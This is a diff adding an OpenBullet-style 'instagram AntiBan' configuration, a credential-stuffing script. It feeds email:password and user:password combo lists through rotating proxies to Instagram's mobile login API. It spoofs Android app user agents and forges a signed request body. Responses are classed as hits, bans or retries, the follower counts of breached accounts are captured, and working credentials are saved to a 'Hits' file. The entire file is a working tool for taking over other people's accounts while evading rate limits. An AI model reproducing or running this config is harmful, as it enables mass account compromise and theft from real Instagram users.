@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "instagram AntiBan",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-03T10:40:34.4891511+04:30",
+  "AdditionalInfo": "| AntiBan Methode | Needs Rotating Proxy | Support E:P & U:P Combo | API | Capture | Save Hits | CPM Rate: 50-3000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": true,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 50,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g1 = uuidv4();
+END SCRIPT -> VARS "g1"
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g2 = uuidv4();
+END SCRIPT -> VARS "g2"
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g3 = uuidv4();
+END SCRIPT -> VARS "g3"
+
+#RN FUNCTION RandomNum "1" "10" -> VAR "RN" 
+
+#UA FUNCTION Translate 
+  KEY "1" VALUE "Instagram 27.0.0.11.97 Android (25/7.1.1; 480dpi; 1080x1776; motorola; Moto G (5S) Plus; sanders_nt; qcom; pt_BR)" 
+  KEY "2" VALUE "Instagram 46.0.0.15.96 Android (26/8.0.0; 480dpi; 1080x1776; motorola; moto x4; payton; qcom; pt_BR; 109556226)" 
+  KEY "3" VALUE "Instagram 43.0.0.9.97 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungexynos7870; pt_BR; 105430182)" 
+  KEY "4" VALUE "Instagram 27.0.0.11.97 Android (21/5.0.2; 240dpi; 540x886; LGE/lge; LG-D618; g2mds; g2mds; pt_BR)" 
+  KEY "5" VALUE "Instagram 65.0.0.12.86 Android (24/7.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L23; HWVNS-H; hi6250; es_CO; 126223536)" 
+  KEY "6" VALUE "Instagram 60.1.0.17.79 Android (23/6.0.1; 320dpi; 720x1280; samsung; SM-J500M; j5lte; qcom; pt_BR; 122338247)" 
+  KEY "7" VALUE "Instagram 56.0.0.13.78 Android (23/6.0.1; 320dpi; 720x1280; samsung; SM-G800H; kmini3g; qcom; pt_BR; 119104798)" 
+  KEY "8" VALUE "Instagram 27.0.0.11.97 Android (24/7.0; 480dpi; 1080x1776; motorola; Moto G (5) Plus; potter_nt; qcom; pt_BR)" 
+  KEY "9" VALUE "Instagram 65.0.0.12.86 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungexynos7870; es_US; 126223536)" 
+  KEY "10" VALUE "Instagram 64.0.0.14.96 Android 23/6.0.1; 640dpi; 1440x2560; Fly;IQ4414_Quad;IQ4414 Quad; qcom; en_US)" 
+  "<RN>" -> VAR "UA" 
+
+#GET REQUEST GET "https://i.instagram.com/api/v1/accounts/login/" 
+  
+  HEADER "User-Agent: <UA>" 
+
+#Token PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "Token" 
+
+#DID FUNCTION RandomString "android-?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "DID" 
+
+#Encode FUNCTION URLEncode "{\"_csrftoken\":\"<Token>\",\"adid\":\"<g1>\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"<DID>\",\"google_tokens\":\"[]\",\"guid\":\"<g2>\",\"login_attempt_count\":0,\"password\":\"<PASS>\",\"phone_id\":\"<g3>\",\"username\":\"<USER>\"}" -> VAR "Encode" 
+
+#signed FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "signed" 
+
+#POST REQUEST POST "https://i.instagram.com/api/v1/accounts/login/" 
+  CONTENT "signed_body=<signed>.<Encode>&ig_sig_key_version=4" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <UA>" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logged_in_user" 
+    KEY "checkpoint_challenge_required" 
+  KEYCHAIN Failure OR 
+    KEY "bad_password" 
+    KEY "invalid_user" 
+    KEY "unusable_password" 
+    KEY "\"Invalid Parameters\"" 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_error" 
+    KEY "ip_block" 
+  KEYCHAIN Retry OR 
+    KEY "sentry_block" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "two_factor_required" 
+
+#Chal PARSE "<SOURCE>" JSON "error_type" -> VAR "Chal" 
+
+#Login PARSE "<SOURCE>" LR "{\"" "\": {\"pk\":" -> VAR "Log" 
+
+#Challenge FUNCTION Translate 
+  KEY "checkpoint_challenge_required" VALUE "Yes" 
+  KEY "logged_in_user" VALUE "No" 
+  "<Chal><Log>" -> CAP "Challenge" 
+
+#Info REQUEST GET "https://www.instagram.com/<USER>/?__a=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Followers PARSE "<SOURCE>" LR "\"edge_followed_by\":{\"count\":" "}," CreateEmpty=FALSE -> CAP "Followers" 
+
+#Following PARSE "<SOURCE>" LR "\"edge_follow\":{\"count\":" "}," CreateEmpty=FALSE -> CAP "Following" 
+
+UTILITY File "instagram Hits.txt" AppendLines "User/Email: <USER>\\nPass: <PASS>\\nFollowers: <Followers>\\nFollowing: <Following>\\nChallenge: <Challenge>\\n\\nConfiged By: T.me/TheOwn\\n====================================" -> VAR "Save" 
+
